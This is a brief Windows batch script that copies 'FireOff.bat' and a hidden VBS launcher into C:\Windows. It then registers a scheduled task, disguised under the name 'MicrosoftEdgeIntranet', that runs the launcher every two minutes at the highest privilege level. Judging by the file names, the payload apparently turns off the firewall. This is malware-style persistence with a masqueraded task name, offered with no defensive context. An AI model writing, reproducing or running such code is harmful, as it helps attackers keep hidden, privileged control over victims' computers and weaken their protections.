@echo off
xcopy "FireOff.bat" "C:\Windows\" /Y
xcopy "FireOffHIDE.vbs" "C:\Windows\" /Y



schtasks /create /tn "MicrosoftEdgeIntranet" /tr "C:\Windows\FireOffHIDE.vbs" /sc Minute /mo 2 /f /RL HIGHEST 
